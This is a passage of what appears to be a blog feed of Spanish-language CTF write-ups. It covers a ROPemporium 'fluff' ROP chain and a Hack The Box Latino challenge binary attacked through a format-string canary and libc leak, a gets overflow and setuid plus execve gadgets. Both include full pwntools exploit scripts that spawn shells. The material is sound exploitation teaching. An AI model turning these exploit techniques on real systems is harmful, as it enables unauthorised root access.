+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-6.png&quot; alt=&quot;&quot; class=&quot;wp-image-182&quot; /&gt;&lt;figcaption&gt;&lt;br /&gt;&lt;/figcaption&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Donde escribir? Buscando podemos descubrir que la sección .bss se puede escribir en 0x601060, trabajamos con esta, podemos chequear permisos y direcciones con  &lt;strong&gt;&lt;em&gt;objdump -h fluff&lt;/em&gt;&lt;/strong&gt; &lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:185} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-9.png&quot; alt=&quot;&quot; class=&quot;wp-image-185&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ok, no se ve tan sencillo como unos simples pop, pero podemos observar que podemos mover la dirección&amp;nbsp; de r11 a la dirección&amp;nbsp; que se contiene r10, pero no tenemos como poner ningún valor en R11 (no se ven POP R11 RET o similar)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:186} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-10.png&quot; alt=&quot;&quot; class=&quot;wp-image-186&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Tampoco tenemos un POP R10 que nos permita setear el valor de la direccion, pero si podemos controlar el valor de r12 &lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:188} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-12.png&quot; alt=&quot;&quot; class=&quot;wp-image-188&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Nuestro plan para este ROP es el siguiente:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:list --&gt;
+&lt;ul&gt;&lt;li&gt;Controlar el valor de r12 con un pop r12  y setearlo a la  &lt;br /&gt;dirección&amp;nbsp; de el segmeto .bss&lt;/li&gt;&lt;li&gt;Setear el valor de R11 a cero usando XOR&lt;/li&gt;&lt;li&gt;Pasar el valor der R12 a R11 usando XOR&lt;/li&gt;&lt;li&gt;usar el gadget con la orden XCHG para intercambiar los valores de R10 y R11 (ahora R10 tiene la dirección&amp;nbsp;de .BSS)&lt;/li&gt;&lt;li&gt;Setear el string de &quot;/bin/sh&quot; a r12 por medio de una instrucción POP R12&lt;/li&gt;&lt;li&gt; Setear el valor de R11 a cero usando XOR &lt;/li&gt;&lt;li&gt; Pasar el valor der R12 a R11 usando XOR &lt;/li&gt;&lt;li&gt;Volver R12 a 0x0 (para no pisarnos con el ultimo XOR BYTE PTR [r10],r12b luego de la instrucción MOV QWORD PTR [r10],r11 en 0x40084e)&lt;/li&gt;&lt;li&gt;Mover R11 como contenido a la dirección en R10 (en este caso el segmento .bss)&lt;/li&gt;&lt;/ul&gt;
+&lt;!-- /wp:list --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Suena bien, con la ayuda de pwntools, ropper y la información  en el binario podemos completar el rop:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:192} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-13.png&quot; alt=&quot;&quot; class=&quot;wp-image-192&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Aca el exploit completo&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:code --&gt;
+&lt;pre class=&quot;wp-block-code&quot;&gt;&lt;code&gt;from pwn import *
+
+e = ELF('./fluff')
+r = process(&quot;./fluff&quot;)
+#gdb.attach(r) #para atachar GDB duh!
+#copiar la bss address a r12
+rop = p64(0x0000000000400832) #pop r12; mov r13d, 0x604060; ret; 
+rop += p64(0x601060) #bss a r12 (pop)
+#poner en cero r11
+rop += p64(0x0000000000400820) #xor x11 x11
+rop += &quot;DPLADPLA&quot; #pop r15
+rop += &quot;DPLADPLA&quot; #pop r14
+#xor moviendo r12 a r11 con xor
+rop += p64(0x000000000040082d)
+rop += &quot;DPLADPLA&quot; #pop r14
+rop += &quot;DPLADPLA&quot; #pop a r12
+#xchg cambiando r11 con r10
+rop += p64(0x000000000040083b) 
+rop += &quot;DPLADPLA&quot; #pop a r15
+#bss queda en r10
+#comenzaomos a escribinr binsh
+#binsh a r12
+rop += p64(0x0000000000400832) #pop r12; mov r13d, 0x604060; ret;
+rop += &quot;/bin//sh&quot; #string de /bin/sh pop a r12
+#r11 a cero
+rop += p64(0x0000000000400820) #xor x11 x11
+rop += &quot;DPLADPLA&quot; #pop r15
+rop += &quot;DPLADPLA&quot; #pop r14
+#r12 a r11
+#xor moviendo r12 a r11 con xor
+rop += p64(0x000000000040082d)
+rop += &quot;DPLADPLA&quot; #pop r14
+rop += p64(0x0000000000000000) #pop a r12
+#move de r11 al contenido de r10
+rop += p64(0x000000000040084c)#move, volver r12 a cero antes
+rop += &quot;DPLADPLA&quot; #pop r15
+rop += &quot;DPLADPLA&quot; #pop r13
+rop += p64(0x0000000000000000) #pop r12 para el xor y que no cambie
+
+#system
+rop += p64(0x00000000004008c3)#pop rdi; ret;
+rop += p64(0x601060)
+rop += p64(e.symbols['system']) #magia de pwntools
+
+payload = &quot;A&quot; * 40
+payload += rop
+r.sendlineafter(&quot;&amp;gt;&quot;, payload)
+r.interactive()&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- /wp:code --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ejecutar y shell ! Espero les haya gustado&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:196} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/image-17.png&quot; alt=&quot;&quot; class=&quot;wp-image-196&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;</content><author><name></name></author><category term="buffer overflow" /><category term="CTF" /><category term="dplastico" /><category term="exploit dev" /><category term="exploitdev" /><category term="pwn" /><category term="rop" /><category term="ROPemporium" /><category term="Sin categoría" /><summary type="html">Hace tiempo que no escribia, pero tenia este post guardado de hace un tiempo, asi que hoy me anime a tomar un par de screenshots y hablar al respecto, ya que me parecio un ejercico super bueno para explicar como funciona ROP, esta vez con algunos gadgets un poco inusuales, asi que con el animo de seguir con lo educativo (que a mi me sirve para aprender) nos lanzamos con este post</summary></entry><entry><title type="html">writeup, Desafio L4t1n HTB (parte final, 2501)</title><link href="http://localhost:4000/aslr/byapss/canary/format%20string/hack%20the%20box/htb/memory%20leak/overflow/q4/rop/sin%20categor%C3%ADa/writeup/2019/10/06/writeup-desafio-l4t1n-htb-parte-final-2501.html" rel="alternate" type="text/html" title="writeup, Desafio L4t1n HTB (parte final, 2501)" /><published>2019-10-06T00:10:00-03:00</published><updated>2019-10-06T00:10:00-03:00</updated><id>http://localhost:4000/aslr/byapss/canary/format%20string/hack%20the%20box/htb/memory%20leak/overflow/q4/rop/sin%20categor%C3%ADa/writeup/2019/10/06/writeup-desafio-l4t1n-htb-parte-final-2501</id><content type="html" xml:base="http://localhost:4000/aslr/byapss/canary/format%20string/hack%20the%20box/htb/memory%20leak/overflow/q4/rop/sin%20categor%C3%ADa/writeup/2019/10/06/writeup-desafio-l4t1n-htb-parte-final-2501.html">&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Hola acá les dejo el writeup/solución del desafío que publicamos con l4t1n HTB y Q4, El desafío consistía de una parte web, un crypto y luego este, un binario que permitía escalar a root, entregando la flag final. El binario lo pueden descargar de acá&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Como dato para correr el binario remoto y escalar en sus maquinas locales, deben ejecutar como root el binario de la siguiente forma&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;strong&gt;socat tcp-listen:5555,reuseaddr,fork, exec:&quot;./2501&quot;&lt;/strong&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/dplastico/desafio_2501&quot;&gt;https://github.com/dplastico/desafio_2501&lt;/a&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Luego de reconocimiento nos encontramos con un archivo llamado 2501 el cual después de analizar y previa enumeración nos damos cuenta es el mismo que esta corriendo como root en el puerto 5555&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;El programa simplemente pide un nombre y luego un código el cual devuelve  nuestro &quot;input&quot;... mmm...  Que podrá significar esto…&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:138} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture1.png&quot; alt=&quot;&quot; class=&quot;wp-image-138&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Dado que tenemos
+el mismo binario procedemos a analizarlo podemos ver que tiene activada las
+protecciones PIE, NX y CANARY (observamos algunas herramientas útiles como
+pwntools instaladas)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:139} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture2.png&quot; alt=&quot;&quot; class=&quot;wp-image-139&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Y además es un ELF 64 bits dinámicamente “linkeado” por lo que ocupa librerías de libc&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:161,&quot;width&quot;:688,&quot;height&quot;:51} --&gt;
+&lt;figure class=&quot;wp-block-image is-resized&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/image-1024x77.png&quot; alt=&quot;&quot; class=&quot;wp-image-161&quot; width=&quot;688&quot; height=&quot;51&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Analicemos el binario y sus funciones podemos descargarlo para mayor conveniencia luego deberemos ejecutarlo remoto (para esto ocuparé Hopper)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Observamos que
+lee la variable var_50 desde un input y luego la imprime!&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:141} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture4.png&quot; alt=&quot;&quot; class=&quot;wp-image-141&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Esto Parece un format string, probémoslo&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Format_String_Attack&quot;&gt;https://es.wikipedia.org/wiki/Format_String_Attack&lt;/a&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:142} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture5.png&quot; alt=&quot;&quot; class=&quot;wp-image-142&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Efectivamente
+tenemos un memory leak! Antes de aprovecharnos de el sigamos revisando el
+binario&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Vemos que la función center la cual nos lleva el flujo del binario tiene un clásico overflow via GETS &lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;a href=&quot;https://linux.die.net/man/3/gets&quot;&gt;https://linux.die.net/man/3/gets&lt;/a&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:143} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture6.png&quot; alt=&quot;&quot; class=&quot;wp-image-143&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ok, Tenemos
+ASLR en el sistema y el binario esta con la protección PIE por lo que debemos
+encontrar una forma de generar un “leak” de alguna dirección en libc, calcular
+el offset a la dirección base y de esta forma poder realizar un buffer overflow
+con ret2libc, pero dado que no tenemos una llamada a system, será mejor probar con
+ROP ya que el stack no es ejecutable, por lo que un shellcode no servirá pero
+tenemos algunos problemas, primero tenemos que ver como bypasear la protección
+de stack cookies, o CANARY&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;&lt;a href=&quot;https://access.redhat.com/blogs/766093/posts/3548631&quot;&gt;Acá&amp;nbsp;tenemos&lt;/a&gt; una explicación de que es la protección CANARY Y &lt;a href=&quot;https://es.wikipedia.org/wiki/Aleatoriedad_en_la_disposici%C3%B3n_del_espacio_de_direcciones&quot;&gt;ASLR&lt;/a&gt;&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Para lograr
+esto en 32 bit podríamos intentar hacer un “brute force” a la dirección de
+canary, pero dado que nos encontramos en 64 bit esto no parece posible (serian
+mas de 16^7 direcciones, algo más de 260 millones)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Pero tenemos un format string! Será que podemos hacer un “leak” de esta dirección? Veamos que podemos ver en gdb, para eso debemos frenar la ejecución luego de ingresar nuestro bof, veamos:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Primero nos
+encargamos de filtrar las direcciones en un formato reconocible para eso las
+ponemos separadas por guiones y en formato mas legible&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:144} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture7.png&quot; alt=&quot;&quot; class=&quot;wp-image-144&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Veamos si
+alguna de estas direcciones puede servirnos, avanzamos en el programa en busca
+del chequeo del canary, pegamos nuestro breakpoint en la función center (con el
+bof) y continuamos&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Haciendo un
+disassembly podemos ver que al registro RAX se le asigna un valor y luego se
+hace XOR que al compararse, si falla nos redirige a stack_chk_fail&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:145} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture8.png&quot; alt=&quot;&quot; class=&quot;wp-image-145&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Veamos si
+podemos encontrar el valor de RAX en nuestro leak luego de esta misma operación
+y que corresponde al valor del “leak” numero 15 después de “Hello”&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:146} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture9.png&quot; alt=&quot;&quot; class=&quot;wp-image-146&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Bueno y ahora? No sabemos en que offset está nuestro canary ni donde nuestra dirección de retorno, así que llego la hora de scriptear!, armemos un skeleton script en Python con pwntools ya que están en el server. Con mi config de gef creo un script fácil que ya tengo pre-seteado con el cual solo necesito crear la función exploit (mas info sobre GEF acá &lt;a href=&quot;https://github.com/hugsy/gef&quot;&gt;https://github.com/hugsy/gef&lt;/a&gt;)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:147} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture10.png&quot; alt=&quot;&quot; class=&quot;wp-image-147&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;pero creare dos
+funciones, primero una para calcular el offset del canary, aprovechándonos del
+mensaje de “stack smashing detected”:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:148} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture11.png&quot; alt=&quot;&quot; class=&quot;wp-image-148&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Con esto
+podemos calcular el offset del canary el cual se encuentra en a 136 caracteres
+de input, con esto procedemos a calcular el offset a la dirección de retorno,
+podemos crear una pequeña función&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:149} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture12.png&quot; alt=&quot;&quot; class=&quot;wp-image-149&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;OK con esto
+calculamos que la dirección de retorno se encuentra 8 bytes luego del CANARY,
+así que ahora ya podemos comenzar a construir la llamada a nuestra Shell. Pero
+tenemos PIE, como lograrlo?&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Debemos
+calcular el offset de alguna dirección de libc, esta vez podemos ver que las
+primeras direcciones parecen ser de libc, por lo que veamos si se cargan en
+algun registro que nos permita hacer el cálculo:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Generamos un
+leak:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:150,&quot;width&quot;:870,&quot;height&quot;:77} --&gt;
+&lt;figure class=&quot;wp-block-image is-resized&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture13.png&quot; alt=&quot;&quot; class=&quot;wp-image-150&quot; width=&quot;870&quot; height=&quot;77&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Y observamos
+los registros (info reg)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:151} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture14.png&quot; alt=&quot;&quot; class=&quot;wp-image-151&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Vemos como el
+cuarto valor se asigna al registro R8, si esta dirección es de libc siempre
+podremos saber el offset para calcular la dirección base de libc!&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Observamos la dirección de libc base (info proc map)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:153} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture15.png&quot; alt=&quot;&quot; class=&quot;wp-image-153&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Excelente así que
+ahora podemos calcular el offset&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:154} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture16-1.png&quot; alt=&quot;&quot; class=&quot;wp-image-154&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Genial tenemos el
+offset para calcular libc &lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ya podemos
+empezar a armar nuestro exploit! Tenemos varias posibilidades, pero para esta
+vez usare una técnica, que aprendí hace poco, Construiremos nuestro exploit de
+la siguiente forma&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;JUNK + CANARY
++JUNK(hasta ret) + poprdi(en libc)+NULL(para setuid) + SETUID(en libc) +
+GADGET(execve(“/bin/sh”))&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Para buscar un
+pop rdi ret usamos ropper&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:155} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture17.png&quot; alt=&quot;&quot; class=&quot;wp-image-155&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Para buscar
+setuid usamos pwntools y luego buscamos nuestro gadget, esta vez usaremos la
+herramienta one_gadget (vaya que es útil) para buscar un execve(“/bin/sh”)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:156} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture18.png&quot; alt=&quot;&quot; class=&quot;wp-image-156&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Ahora armemos
+todo junto&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:157} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture19.png&quot; alt=&quot;&quot; class=&quot;wp-image-157&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Listo A ejecutar
+remoto!&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:158} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/10/Picture20.png&quot; alt=&quot;&quot; class=&quot;wp-image-158&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Desafio concluido! espero les haya gustado :)&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Exploit final:&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:code --&gt;
+&lt;pre class=&quot;wp-block-code&quot;&gt;&lt;code&gt;#!/usr/bin/env python2
+import sys
+from pwn import *
+context.update(arch=&quot;amd64&quot;, endian=&quot;little&quot;, os=&quot;linux&quot;,
+               terminal=[&quot;gnome-terminal&quot;, &quot;new window&quot;],)
+LOCAL, REMOTE = False, False
+TARGET=os.path.realpath(&quot;2501&quot;)
+e = ELF(TARGET)
+l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+#ejecutar python exploit.py remote (para tomar el proceso en escucha)
+#la cuarta direccion que se lekea nos da un offset para calcular libc base
+#&amp;gt;&amp;gt;&amp;gt; offset = 0x7ffff7ff2440 - 0x7ffff7a3a000
+#&amp;gt;&amp;gt;&amp;gt; print hex(offset)
+#0x5b8440
+#&amp;gt;&amp;gt;&amp;gt; 
+offset = 0x1c2500 # de R9 que parece estar en libc
+#calculamos este gadget con one_gadget (vaya herramienta)
+gadget = 0x4484f   #excev(/bin/sh)
+setuid = l.symbols['setuid'] # no necesita explicacion
+pop_rdi = 0x23a5f #pop rdi ret en libc (por que no?)
+
+#funcion para calcular el canary... no mucho que explicar
+def offset_canary(): 
+    for i in range(1, 200):
+        r = process([TARGET,])
+        test = &quot;aaa&quot;
+        pattern = &quot;A&quot; * i
+        r.sendlineafter(&quot;Name: &quot;, test)
+        r.readuntil('Code:')
+        r.sendline(pattern)
+        response = r.recvall()
+        
+        if &quot;stack smashing detected&quot; in response:
+            print &quot;CANARY empieza en &quot;, i
+            r.close()
+            break
+        else:
+            print &quot;NAAAAAA siga particopando &quot;
+            r.close()
+
+#con esta funcion descrubrimos el offset en canary + 8 bytes (cae en RSP)
+def offset_ret(r):
+    #r = process([TARGET,])
+    test = &quot;%lx-&quot; * 15
+    r.sendlineafter(&quot;Name: &quot;, test)
+    response = r.readuntil('Code:')
+    response = response.split('-')
+    canary = int(response[-2],16)
+    print hex(canary)
+    pattern = &quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII&quot; #encontrado 8 mas (donde empiezan las C)
+    payload = &quot;A&quot; * 136 + p64(canary) + pattern
+
+    r.sendline(payload)
+    #resp = r.recvall()
+    r.interactive()
+
+def exploit(r):
+    payload = &quot;%lx-&quot; * 15
+    r.sendlineafter(&quot;Name: &quot;, payload)
+    response = r.readuntil('Code:')
+    response = response.split('-')
+    print &quot;format strings shits : &quot;, response
+    canary = int(response[-2],16)
+    print hex(canary)
+    libc = int(response[3],16) - offset
+    print hex(libc)
+    payload = &quot;A&quot; * 136
+    payload += p64(canary)
+    payload += &quot;B&quot; * 8 #junk hasta ret 
+    payload += p64(libc + pop_rdi)
+    payload += p64(0x0)  #null para setuid
+    payload += p64(libc + setuid) #si vamos a usar esta tecnica ojo con la prueba local
+    payload += p64(libc + gadget) #super gadget
+    r.sendline(payload)
+    r.interactive()
+    return
+
+if __name__ == &quot;__main__&quot;:
+    if len(sys.argv)==2 and sys.argv[1]==&quot;remote&quot;:
+        REMOTE = True
+        r = remote(&quot;127.0.0.1&quot;, 5555)
+    else:
+        LOCAL = True
+        r = process([TARGET,])
+        print &quot;PID para debug&quot;
+    print util.proc.pidof(r) #solo para atachar a GDB soy flojo
+        #pause() #ermm
+    exploit(r)
+    #offset_canary()
+   #offset_ret(r)
+    sys.exit(0)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;!-- /wp:code --&gt;</content><author><name></name></author><category term="ASLR" /><category term="byapss" /><category term="canary" /><category term="format string" /><category term="hack the box" /><category term="htb" /><category term="memory leak" /><category term="overflow" /><category term="Q4" /><category term="rop" /><category term="Sin categoría" /><category term="writeup" /><summary type="html">Hola acá les dejo el writeup/solución del desafío que publicamos con l4t1n HTB y Q4, El desafío consistía de una parte web, un crypto y luego este, un binario que permitía escalar a root, entregando la flag final. El binario lo pueden descargar de acá</summary></entry><entry><title type="html">writeup, JuntosAlPoder Q4 CTF 2019</title><link href="http://localhost:4000/ctf/q4/sin%20categor%C3%ADa/stego/writeup/2019/09/02/writeup-q4-ctf.html" rel="alternate" type="text/html" title="writeup, JuntosAlPoder Q4 CTF 2019" /><published>2019-09-02T13:39:00-04:00</published><updated>2019-09-02T13:39:00-04:00</updated><id>http://localhost:4000/ctf/q4/sin%20categor%C3%ADa/stego/writeup/2019/09/02/writeup-q4-ctf</id><content type="html" xml:base="http://localhost:4000/ctf/q4/sin%20categor%C3%ADa/stego/writeup/2019/09/02/writeup-q4-ctf.html">&lt;!-- wp:paragraph --&gt;
